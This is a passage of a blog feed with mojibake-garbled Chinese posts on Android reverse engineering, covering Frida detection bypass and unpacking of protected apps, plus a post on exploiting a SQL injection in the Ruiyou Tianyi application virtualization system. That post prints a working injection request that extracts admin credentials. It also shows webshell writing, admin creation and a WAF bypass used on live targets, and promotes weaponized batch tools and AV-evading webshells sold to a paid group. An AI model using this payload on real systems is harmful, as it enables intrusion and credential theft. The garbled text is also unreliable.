æ˜¯fridaç‰ˆæœ¬ä¸ç¨³å®šçš„åŸå›  è¦å¤šæ¬¡spwnæ‰å¯ä»¥æ­£å¸¸è¿è¡Œã€‚æˆ–è€…é™ä½fridaç‰ˆæœ¬ã€‚æ‰€ä»¥é‡åˆ°é”™è¯¯è¦å¤šæµ‹è¯•å‡ æ¬¡è¦ä¸çœŸä»¥ä¸ºspwnæ£€æµ‹fridaã€‚ä½†æ˜¯åœ¨attachæ¨¡å¼ä¸‹æ˜¯ä¼šæ£€æµ‹çš„æ‰€ä»¥æˆ‘ä»¬ä¹Ÿè¦å¤šæ¬¡æµ‹è¯•ä¿è¯fridaå…ˆäºapp attachä¸Š!!!!</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304181615684.png" alt="æ­£å¸¸è¿è¡Œäº†"></p></ul><h2 id="å‡ ç»´å®‰å…¨åŠ å›ºçš„ç‰¹å¾è„±å£³æ¼”ç¤º"><a href="#å‡ ç»´å®‰å…¨åŠ å›ºçš„ç‰¹å¾è„±å£³æ¼”ç¤º" class="headerlink" title="å‡ ç»´å®‰å…¨åŠ å›ºçš„ç‰¹å¾è„±å£³æ¼”ç¤º"></a>å‡ ç»´å®‰å…¨åŠ å›ºçš„ç‰¹å¾è„±å£³æ¼”ç¤º</h2><ul><li>åœ¨libç›®å½•é‡Œæœ‰æœ‰libKwProtectSDK.so ã€‚åœ¨assets ç›®å½•é‡Œé¢æœ‰ kadp_arm64-v8aã€‚æ­¤å¤–è¿™ä¸ªç‰ˆæœ¬æ˜¯æ•´ä½“åŠ å›ºæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨ è‘«èŠ¦å¨ƒå¤§ä½¬çš„frida-dexdumpè¿›è¡Œè„±å£³</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304181628134.png" alt="å‡ ç»´å®‰å…¨åŠ å›ºç‰¹å¾"></p><li>è„±å£³æ¼”ç¤º<li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304181631629.png" alt="è„±å£³æˆåŠŸæ¥ä¸‹æ¥å°±æ˜¯åˆ†æ"></p></ul><h2 id="frida-hookè„šæœ¬å®šä½æ£€æµ‹ç‚¹"><a href="#frida-hookè„šæœ¬å®šä½æ£€æµ‹ç‚¹" class="headerlink" title="frida hookè„šæœ¬å®šä½æ£€æµ‹ç‚¹"></a>frida hookè„šæœ¬å®šä½æ£€æµ‹ç‚¹</h2><ul><li>å®šä½rootæ£€æµ‹ç‚¹</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304181642221.png" alt="å®šä½rootæ£€æµ‹ç‚¹"></p><li>ä½¿ç”¨æˆ‘ä»¬çš„è„šæœ¬å¯èƒ½ç”±äºæˆ‘ä»¬çš„è„šæœ¬æ£€æµ‹ä¸å…¨æ‰€ä»¥ä¹Ÿå¼¹å‡ºæ¡†ã€‚æ‰€ä»¥æˆ‘ä»¬ç›´æ¥ç¼–å†™hook æ£€æµ‹å‡½æ•°çš„è„šæœ¬ç›´æ¥ä¸Šã€‚</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304181650219.png" alt="è¿‡æ‰rootæ£€æµ‹"></p></ul><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><ul><li>(1)é‡åˆ°appå¥”æºƒçš„æ—¶å€™å¤šæµ‹è¯•å‡ æ¬¡æˆ–è€…æ¢ä¸€ä¸ªç‰ˆæœ¬ä½ç‚¹çš„è¿›è¡Œæµ‹è¯•</li><li>(2)å¤šè‡ªå·±å†™ç‚¹å¸¸ç”¨æ£€æµ‹å®šçš„è„šæœ¬æ–¹ä¾¿å®šä½</li><li>(3)åœ¨frida hookæ—¶å€™æˆ‘ä»¬å¿…é¡»è¦ç†Ÿç»ƒæŒæ¡å¸¸ç”¨hook apiå’ŒjavaseåŸºç¡€æ‰èƒ½å¤Ÿå¥½çš„å­¦ä¹ app</li></ul>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç‘å‹å¤©ç¿¼åº”ç”¨è™šæ‹ŸåŒ–ç³»ç»Ÿsqlæ³¨å…¥å¯¼è‡´ä»£ç æ‰§è¡Œæ¼æ´å¤ç°</title>
      <link href="/penetrationtest/2023/04/articles/5d3d24785f2881ff/"/>
      <url>/penetrationtest/2023/04/articles/5d3d24785f2881ff/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="ç‘å‹å¤©ç¿¼åº”ç”¨è™šæ‹ŸåŒ–ç³»ç»Ÿä»‹ç»"><a href="#ç‘å‹å¤©ç¿¼åº”ç”¨è™šæ‹ŸåŒ–ç³»ç»Ÿä»‹ç»" class="headerlink" title="ç‘å‹å¤©ç¿¼åº”ç”¨è™šæ‹ŸåŒ–ç³»ç»Ÿä»‹ç»"></a>ç‘å‹å¤©ç¿¼åº”ç”¨è™šæ‹ŸåŒ–ç³»ç»Ÿä»‹ç»</h1><ul><li>ç‘å‹å¤©ç¿¼åº”ç”¨è™šæ‹ŸåŒ–ç³»ç»Ÿï¼ˆGWT Systemï¼‰æ˜¯å›½å†…å…·æœ‰è‡ªä¸»çŸ¥è¯†äº§æƒçš„åº”ç”¨è™šæ‹ŸåŒ–å¹³å°ï¼Œæ˜¯åŸºäºæœåŠ¡å™¨è®¡ç®—ï¼ˆServer-based Computingï¼‰çš„åº”ç”¨è™šæ‹ŸåŒ–å¹³å°ã€‚å®ƒå°†ç”¨æˆ·æ‰€æœ‰åº”ç”¨è½¯ä»¶ï¼ˆERPã€OAã€CRMã€PDMã€CADâ€¦â€¦ï¼‰é›†ä¸­éƒ¨ç½²åœ¨å¤©ç¿¼æœåŠ¡å™¨ï¼ˆç¾¤ï¼‰ä¸Šï¼Œå®¢æˆ·ç«¯é€šè¿‡WEBå³å¯å¿«é€Ÿå®‰å…¨çš„è®¿é—®ç»æœåŠ¡å™¨ä¸Šæˆæƒçš„åº”ç”¨è½¯ä»¶ï¼Œå®ç°é›†ä¸­åº”ç”¨ã€è¿œç¨‹æ¥å…¥ã€ååŒåŠå…¬ç­‰ï¼Œä»è€Œä¸ºç”¨æˆ·æ‰“é€ é›†ä¸­ã€ä¾¿æ·ã€å®‰å…¨ã€é«˜æ•ˆçš„è™šæ‹ŸåŒ–æ”¯æ’‘å¹³å°ã€‚æ“ä½œç»ˆç«¯æ— éœ€å†å®‰è£…åº”ç”¨ç¨‹åºï¼Œé€šè¿‡å¤©ç¿¼ç‹¬ç‰¹çš„RAP åè®®ï¼ˆRemote Application Protocolï¼‰ï¼Œå³å¯è®©ç”¨æˆ·å¿«é€Ÿè®¿é—®æœåŠ¡å™¨ä¸Šçš„å„ç±»åº”ç”¨è½¯ä»¶ï¼›å¤©ç¿¼RAP åè®®åªä¼ è¾“é¼ æ ‡ã€é”®ç›˜åŠå±å¹•å˜åŒ–çš„çŸ¢é‡æ•°æ®ï¼Œè®¿é—®ä»…éœ€3KB/sï¼ˆ20kbpsï¼‰çš„å¸¦å®½ï¼Œç”¨æˆ·ä¸å†å—å®¢æˆ·ç«¯å’Œè¿æ¥æ€§èƒ½è¦æ±‚çš„é™åˆ¶ï¼Œåœ¨ä»»ä½•æ—¶é—´ã€ä»»ä½•åœ°ç‚¹ï¼Œåˆ©ç”¨ä»»ä½•è®¾å¤‡ã€ä»»ä½•ç½‘ç»œè¿æ¥æ–¹å¼ï¼Œå³å¯é«˜æ•ˆå®‰å…¨åœ°è®¿é—®æœåŠ¡å™¨ï¼ˆç¾¤ï¼‰ä¸Šçš„åº”ç”¨ç¨‹åºå’Œå…³é”®èµ„æº</li></ul><h2 id="ç³»ç»Ÿç•Œé¢"><a href="#ç³»ç»Ÿç•Œé¢" class="headerlink" title="ç³»ç»Ÿç•Œé¢"></a>ç³»ç»Ÿç•Œé¢</h2><ul><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304151452516.png" alt="ä¸»é¡µè§é¢"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304151453050.png" alt="ç®¡ç†å‘˜ç•Œé¢"></p></ul><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><ul><li>sqlæ³¨å…¥æ¼æ´å¤ç°æˆªå›¾</li>sqlæ³¨å…¥ç®€å•payloadç»™ä½ ä»¬æˆªå›¾æ”¾å‡ºæ¥äº†<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304151455681.png" alt="sqlæ³¨å…¥"></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">POST</span> <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span><span class="token operator">/</span>Index<span class="token operator">/</span>dologin <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span><span class="token literal-property property">Host</span><span class="token operator">:</span> www<span class="token punctuation">.</span>testcms<span class="token punctuation">.</span>comCache<span class="token operator">-</span>Control<span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>Upgrade<span class="token operator">-</span>Insecure<span class="token operator">-</span>Requests<span class="token operator">:</span> <span class="token number">1</span><span class="token literal-property property">Origin</span><span class="token operator">:</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>testcms<span class="token punctuation">.</span>comUser<span class="token operator">-</span>Agent<span class="token operator">:</span> Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>Windows <span class="token constant">NT</span> <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token constant">WOW64</span><span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span><span class="token constant">KHTML</span><span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">108.0</span><span class="token number">.5359</span><span class="token number">.95</span> Safari<span class="token operator">/</span><span class="token number">537.36</span><span class="token literal-property property">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://www.testcms.com/Accept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=qaq1si606l62k871g450g46n01; CookieLanguageName=ZH-CNConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 132name=adminasdfdsfd') and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,`name`,0x3a,pwd,0x23) FROM cuser limit 0,1),0x7e),1)#</span></code></pre><li>sqlæ³¨å…¥å†™æ–‡ä»¶ </li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304151502987.png" alt="shellè„šæœ¬"></p><li>sqlæ³¨å…¥æ¥å£é€šæ€ </li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304151504432.png" alt="é€šæ€"></p><li>ç›´æ¥æ·»åŠ ç®¡ç†å‘˜</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304151507700.png" alt="ç®¡ç†å‘˜æ·»åŠ ç”¨æˆ·"></p></ul><h2 id="å®æˆ˜æœ€æ–°ç‰ˆæœ¬è¿‡é˜¿é‡Œäº‘waf-getshell"><a href="#å®æˆ˜æœ€æ–°ç‰ˆæœ¬è¿‡é˜¿é‡Œäº‘waf-getshell" class="headerlink" title="å®æˆ˜æœ€æ–°ç‰ˆæœ¬è¿‡é˜¿é‡Œäº‘waf  getshell"></a>å®æˆ˜æœ€æ–°ç‰ˆæœ¬è¿‡é˜¿é‡Œäº‘waf  getshell</h2><ul><li><p>ä½¿ç”¨æˆ‘ä»¬çš„å˜å½¢sqlæ³¨å…¥exp é€šæ€æœ€æ–°ç‰ˆ  ç›´æ¥getshellã€‚æˆ‘ä»¬çš„å·¥å…·ä¸å…‰æ˜¯ç”¨åˆ«äººç°æˆçš„expç›´æ¥é›†æˆè€Œæ˜¯ç»è¿‡æˆ‘ä»¬åŠ å·¥ä½¿ä»–èƒ½å¤Ÿç»•è¿‡wafã€‚æ¥è·å–æ›´å¤šç›®æ ‡ç½‘ç«™ã€‚ä»è€Œæ‰©å¤§æˆ˜æœã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304151926857.png" alt="å®æˆ˜getshell"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304151940176.png" alt="å®æˆ˜æ·»åŠ ç®¡ç†å‘˜"></p></li></ul><h2 id="ç‘å‹å¤©ç¿¼åº”ç”¨è™šæ‹ŸåŒ–ç³»ç»Ÿè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´æ­¦å™¨åŒ–å®æˆ˜æ¼”ç¤ºæˆªå›¾"><a href="#ç‘å‹å¤©ç¿¼åº”ç”¨è™šæ‹ŸåŒ–ç³»ç»Ÿè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´æ­¦å™¨åŒ–å®æˆ˜æ¼”ç¤ºæˆªå›¾" class="headerlink" title="ç‘å‹å¤©ç¿¼åº”ç”¨è™šæ‹ŸåŒ–ç³»ç»Ÿè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´æ­¦å™¨åŒ–å®æˆ˜æ¼”ç¤ºæˆªå›¾"></a>ç‘å‹å¤©ç¿¼åº”ç”¨è™šæ‹ŸåŒ–ç³»ç»Ÿè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´æ­¦å™¨åŒ–å®æˆ˜æ¼”ç¤ºæˆªå›¾</h2><p>è¯¦æƒ…è¯·çœ‹:<a href="https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main">https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main</a></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304161951372.png" alt="é›†æˆæ‰¹é‡æ­¦å™¨åŒ–7.x"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304181420304.png" alt="é›†æˆæ‰¹é‡æ­¦å™¨åŒ–6.x"></p><h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h2><ul><li>æœ€è¿‘æŒºç«çš„ç‘å‹å¤©ç¿¼åº”ç”¨è™šæ‹ŸåŒ–ç³»ç»Ÿè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æœ¬æ¥ä¸æ‰“ç®—æäº†ã€‚å„ç§å…¬ä¼—å·é©¬èµ›å…‹åªè®²ä»£ç å®¡è®¡ã€‚æ²¡æœ‰expè¿™èƒ½è¡Œã€‚ç›´æ¥æ—¥ä»–è¯´è¿™äº›ã€‚è¦ä¸è¯´ç¾¤ä¸»æ°´å¹³å­˜åœ¨é—®é¢˜ã€‚è¿™ä¸ªåªè¦çŸ¥é“è·¯å¾„ã€‚å¹¶ä¸”æœ‰phpæ¥å£ã€‚å¤ç°åº”è¯¥é€šæ€ã€‚ åç»­é›†æˆåˆ°è½¯ä»¶ã€‚ç½‘é©¬é‡‡ç”¨è‡ªå†™çš„å†°èå…æ€ä¸€å¥è¯ ã€‚åå…­è¿›åˆ¶ç¼–ç æ–¹å¼ã€‚sqlæ³¨å…¥çš„è¿‡wafçš„å˜å½¢expã€‚ä»¥åå†…éƒ¨ç¾¤$ç»™åˆ°ä½çš„ã€‚æˆ‘èƒ½åˆ†æèƒ½å¤ç°çš„æ¼æ´å’Œæ¼æ´åŸç† è°ƒè¯•æ–‡ä»¶ç›´æ¥ å‘åˆ°ç¾¤é‡Œã€‚æˆäººä»¥é±¼ä¸å¦‚æˆäººä»¥æ¸”ğŸ˜ ã€‚å¦å¤–æ¯”æ¥å£å¯ä»¥ç›´æ¥æ·»åŠ ç®¡ç†å‘˜ğŸ˜ã€‚ä¸»è¦æ˜¯æºç éš¾æ‰¾æ¼æ´ä¸éš¾ã€‚æƒ…æŠ¥é“¾æ¥ https://mp.weixin.qq.com/s/zeH6p5lFQ4kzu5HpfTpXog</li></ul><h2 id="å…³äºå¤ç°æ¼æ´è®¡åˆ’"><a href="#å…³äºå¤ç°æ¼æ´è®¡åˆ’" class="headerlink" title="å…³äºå¤ç°æ¼æ´è®¡åˆ’"></a>å…³äºå¤ç°æ¼æ´è®¡åˆ’</h2><ul><li>åç»­æœ‰å¤ç°çš„æ¼æ´æœ‰æ—¶é—´å…¨éƒ¨é›†æˆåˆ°æˆ‘ä»¬çš„æ‰¹é‡è‡ªåŠ¨åŒ–å·¥å…·é‡Œé¢ã€‚è®©å®ƒå˜æˆå¾ˆç‰›é€¼çš„å·¥å…·ã€‚ç›¸ä¿¡æˆ‘ä»¬é›†æˆexpéƒ½æ˜¯è‡ªå·±çš„å…æ€ç½‘é©¬å’Œè¿‡wafçš„ expã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>okhttp3æ¡†æ¶frida hookè„šæœ¬-åŸåˆ›</title>
      <link href="/androidreverse/2023/04/articles/1680858695738790/"/>
      <url>/androidreverse/2023/04/articles/1680858695738790/</url>
      
        <content type="html"><![CDATA[<h1 id="okhttp3-æ¡†æ¶ä»‹ç»"><a href="#okhttp3-æ¡†æ¶ä»‹ç»" class="headerlink" title="okhttp3 æ¡†æ¶ä»‹ç»"></a>okhttp3 æ¡†æ¶ä»‹ç»</h1> <ul><li>androidç½‘ç»œæ¡†æ¶ä¹‹OKhttpä¸€ä¸ªå¤„ç†ç½‘ç»œè¯·æ±‚çš„å¼€æºé¡¹ç›®,æ˜¯å®‰å“ç«¯æœ€ç«çƒ­çš„è½»é‡çº§æ¡†æ¶ã€‚ç¼–å†™è¿™ä¸ªè„šæœ¬çš„ç›®çš„æ˜¯ç°åœ¨å¤šæ•°appè¯•ç”¨okhttp3 è¿›è¡Œè¯·æ±‚ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥çœ‹è¯·æ±‚çš„å‚æ•°é€šè¿‡è¿™ä¸ªè„šæœ¬ä»¥å</li></ul><h2 id="è„šæœ¬ç•Œé¢æˆªå›¾"><a href="#è„šæœ¬ç•Œé¢æˆªå›¾" class="headerlink" title="è„šæœ¬ç•Œé¢æˆªå›¾"></a>è„šæœ¬ç•Œé¢æˆªå›¾</h2><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304071729860.png" alt="è„šæœ¬ç•Œé¢æˆªå›¾"></p><h2 id="hookè„šæœ¬æ¼”ç¤º"><a href="#hookè„šæœ¬æ¼”ç¤º" class="headerlink" title="hookè„šæœ¬æ¼”ç¤º"></a>hookè„šæœ¬æ¼”ç¤º</h2><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304071732636.png" alt="hookè„šæœ¬æ¼”ç¤º"></p><h2 id="æ˜¯å¦åšä¸»åŸåˆ›"><a href="#æ˜¯å¦åšä¸»åŸåˆ›" class="headerlink" title="æ˜¯å¦åšä¸»åŸåˆ›"></a>æ˜¯å¦åšä¸»åŸåˆ›</h2><pre><code> <pre class="language-none"><code class="language-none">æ˜¯</code></pre></code></pre><h2 id="ä¸‹è½½åœ°å€"><a href="#ä¸‹è½½åœ°å€" class="headerlink" title="ä¸‹è½½åœ°å€"></a>ä¸‹è½½åœ°å€</h2>  <ul><li>ä¸‹è½½åœ°å€:https://t.me/SoftwareUpdateChannel/136</li></ul>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> original </tag>
            
            <tag> Frida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çˆ±åŠ å¯†ä¼ä¸šç‰ˆè„±å£³-æ–¹æ³•(ä¾èµ–å®šåˆ¶ç³»ç»Ÿ)</title>
      <link href="/androidreverse/2023/03/articles/bb06c9f5435cf86a/"/>
      <url>/androidreverse/2023/03/articles/bb06c9f5435cf86a/</url>
      
        <content type="html"><![CDATA[<h2 id="åŠ å›ºç±»å‹"><a href="#åŠ å›ºç±»å‹" class="headerlink" title="åŠ å›ºç±»å‹"></a>åŠ å›ºç±»å‹</h2><ul><li> æ•´ä½“åŠ å›º:ä¸ªäººç†è§£ æŠŠæ ¸å¿ƒdexåŠ å¯†é™æ€çš„æ—¶å€™çœ‹çš„æ˜¯å£³å­çš„dexã€‚ç­‰appå¯åŠ¨çš„æ—¶å€™é€šè¿‡å£³å­çš„dexè§£å¯†å¹¶ä¸”è¿è¡Œåœ¨å†…å­˜ä¸­è¿è¡Œdex</li><li> æŠ½å–åŠ å›º:ä¸ªäººç†è§£ æŠŠç±»ä¸­çš„æ–¹æ³•ä½“æŠ½ç©º,å¦‚æœç”¨åˆ°è¿™ä¸ªæ–¹æ³•çš„æ—¶å€™ç„¶åå›å¡«åˆ°æ–¹æ³•ä½“ä¸­è°ƒç”¨å®Œæ¯•ä»¥åå†æ¬¡æŠ½ç©ºæ”¹æ–¹æ³•ä½“ã€‚</li><li> è¦å¯¹ä»˜è¿™è¿™ç§æŠ½å–åŠ å›ºæˆ‘ä»¬è¦æŠŠç±»é‡Œé¢çš„æ‰€æœ‰æ–¹æ³•è¿›è¡Œä¸»åŠ¨è°ƒç”¨è°ƒç”¨å®Œæ¯•ä»¥ååœ¨ä¿å­˜dexã€‚å¤§éƒ¨åˆ†æ—¶å€™éœ€è¦ä¿®å¤dex ä¸ºå•¥è¦ä¿®å¤ ä½ æ–¹æ³•ä½“æŠ½ç©ºä»¥åå›å¡«çš„æ—¶å€™æ€»è¦å¯¹æ¯ä¸ªæ–¹æ³•åç§°å’Œæ–¹æ³•ä½“åšæ ‡è®°è¦ä¸ä½ å’‹çŸ¥é“å“ªä¸ªæ˜¯é‚£ä¸ªæ–¹æ³•å¯¹å§ã€‚æ‰€ä»¥è¦è¿›è¡Œä¿®å¤ä½¿å…¶å¯¹åº”ã€‚å½“ç„¶è¿™ç§éœ€è¦é˜…è¯»å®‰å“ç³»ç»Ÿæºç æ‰¾åˆ°åŠ è½½dexçš„å‡½æ•°ã€‚å’Œèƒ½å¯ä»¥ä¸»åŠ¨è°ƒç”¨åˆé€‚çš„å‡½æ•°ã€‚ç„¶åä¿®æ”¹ç³»ç»Ÿæºä»£ç ç¼–è¯‘æˆç³»ç»Ÿåˆ·æœºã€‚</li></ul> <h2 id="æ¡ˆä¾‹"><a href="#æ¡ˆä¾‹" class="headerlink" title="æ¡ˆä¾‹"></a>æ¡ˆä¾‹</h2><ul><li>æŸ¥å£³æ˜¯å¦æ˜¯å®‰å“æŠ¥é”™</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303310937812.png" alt="æŸ¥å£³æ˜¯å¦æ˜¯å®‰å“"></p><li>çœ‹ä¸€ä¸‹appç»“æ„å‘ç°æ˜¯uni-appå¯¹äºè¿™ç§å‘åŒ…è¯·æ±‚åŠ å¯†å¯èƒ½åœ¨jså±‚ã€‚å‘åŒ…å¯èƒ½åœ¨javaå±‚ã€‚è¿™ç§ç”¨javaå±‚ç®—æ³•å®šä½å¯èƒ½å®šä½ä¸äº†ã€‚å½“ç„¶è¿™ç§ä¹Ÿå¯ä»¥è°ƒè¯•ä¸€ä¸‹è¿™ä¸æ˜¯æˆ‘ä»¬çš„é‡ç‚¹æˆ‘ä»¬æ˜¯è¦æ¼”ç¤ºè„±å£³ä¿®å¤</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303310942915.png" alt="æŸ¥å£³appç‰¹æ€§å‘ç°æ˜¯uni-app"></p><li>postern+CharlesæŠ“åŒ…çœ‹çœ‹è¯·æ±‚æ˜¯å¦åŠ å¯†</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303310949226.png" alt="è¯·æ±‚åŠ å¯†äº†"></p></ul><h2 id="ç®—æ³•å®šä½"><a href="#ç®—æ³•å®šä½" class="headerlink" title="ç®—æ³•å®šä½"></a>ç®—æ³•å®šä½</h2><ul><li>frida å…ˆå°è¯•ä¸€javaç®—æ³•å®šä½,å¯ä»¥çœ‹åˆ°è¢«æ£€æµ‹åˆ°äº†</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303310953552.png" alt="è¢«æ£€æµ‹"></p><li>è¿‡firda æ£€æµ‹æ¼”ç¤º </li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303310957936.png" alt="è¿‡firdaæ£€æµ‹"></p><li>ä½¿ç”¨javaé€šæ€ç®—æ³•å®šä½ä¸€ä¸‹,aesç®—æ³•ã€‚å½“ç„¶ç”¨å…¶ä»–å‡½æ•°ä¹Ÿå¯ä»¥å®šä½æˆ‘å°±ä¸æ¼”ç¤ºäº† </li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303311000487.png" alt="å·²ç»å®šä½åˆ°"></p><li>ä½¿ç”¨jadxæŸ¥æ‰¾å…³é”®å‡½æ•°ã€‚æŸ¥è¯¢ä¸åˆ°ã€‚è¦ä¸æ˜¯æ··æ·†è¦ä¸å°±æ˜¯åŠ å£³äº†</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303311003476.png" alt="æœç´¢ä¸åˆ°å…³é”®å‡½æ•°"></p><li>æŸ¥å£³çˆ±åŠ å¯†ä¼ä¸šç‰ˆåˆ©ç”¨ä¹‹å‰çš„è„±å£³å·¥å…·frida-dexdump æ²¡æœ‰è„±æ‰,blackdexç›´æ¥é—ªé€€ã€‚æ‰€ä»¥æˆ‘ä»¬è¦ä½¿ç”¨å®šåˆ¶ç³»ç»Ÿè¿›è¡Œè„±å£³å½“ç„¶è¿™ä¹Ÿä¸æ˜¯ä¸‡èƒ½çš„!!!</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303311005627.png" alt="çˆ±åŠ å¯†ä¼ä¸šç‰ˆ"></p></ul><h2 id="ä½¿ç”¨å®šåˆ¶ç³»ç»Ÿè¿›è¡Œè„±å£³æ¼”ç¤º"><a href="#ä½¿ç”¨å®šåˆ¶ç³»ç»Ÿè¿›è¡Œè„±å£³æ¼”ç¤º" class="headerlink" title="ä½¿ç”¨å®šåˆ¶ç³»ç»Ÿè¿›è¡Œè„±å£³æ¼”ç¤º"></a>ä½¿ç”¨å®šåˆ¶ç³»ç»Ÿè¿›è¡Œè„±å£³æ¼”ç¤º</h2><ul><li>å…ˆæŠŠappå®‰å“åˆ°å®šåˆ¶ç³»ç»Ÿä¸Šç„¶åç›´æ¥å¯åŠ¨appè„±å£³å®Œæ¯•ä»¥åä¼šåœ¨æŒ‡å®šç›®å½•ä¸‹ç”Ÿæˆdexæ–‡ä»¶ã€‚å½“ç„¶å¦‚æœä½ ä¸ç”¨frida è¿‡æ£€æµ‹é‚£ä¹ˆä½ ç”¨è„±å£³ç³»ç»Ÿä¹Ÿä¼šå¥”æºƒå¯¼è‡´æ— æ³•è„±å£³æ‰€ä»¥ã€‚æˆ‘ä»¬éœ€è¦ä½¿ç”¨è„±å£³ç³»ç»Ÿå’Œfridaè¿›è¡Œé…åˆæ‰å¯ä»¥è¿›è¡Œè„±å£³ã€‚è„±å£³åçš„ç»“æœ</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303311014905.png" alt="è„±å£³åçš„ç»“æœ"></p><li>è„±å£³ä¿®å¤ java -jar dexfixer.jar baidu.dex baid.bin baidu.dex ä¿®å¤åæŠŠæ‰€æœ‰dexæ‰“åŒ…zipæ‹–åˆ°jadxé‡Œé¢ </li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303311017779.png" alt="ä¿®å¤åæ‰“åŒ…zip"></p></ul><h2 id="è„±å£³ä¿®å¤åæœç´¢å…³é”®å‡½æ•°"><a href="#è„±å£³ä¿®å¤åæœç´¢å…³é”®å‡½æ•°" class="headerlink" title="è„±å£³ä¿®å¤åæœç´¢å…³é”®å‡½æ•°"></a>è„±å£³ä¿®å¤åæœç´¢å…³é”®å‡½æ•°</h2><ul><li>æœç´¢å…³é”®å‡½æ•°æœç´¢åˆ°äº†å’Œæˆ‘ä»¬java hookå®šä½ä¸€æ ·</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303311021787.png" alt="æœç´¢å‡½æ•°"></p></ul><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><ul><li>è„±å£³ç³»ç»Ÿæ‰“é€ éœ€è¦å¯¹å®‰å“ç³»ç»Ÿå’Œå‰è¾ˆä»¬çš„è„±å£³ä»£ç å’Œè„±å£³ç‚¹è¿›è¡Œæ·±å…¥ç 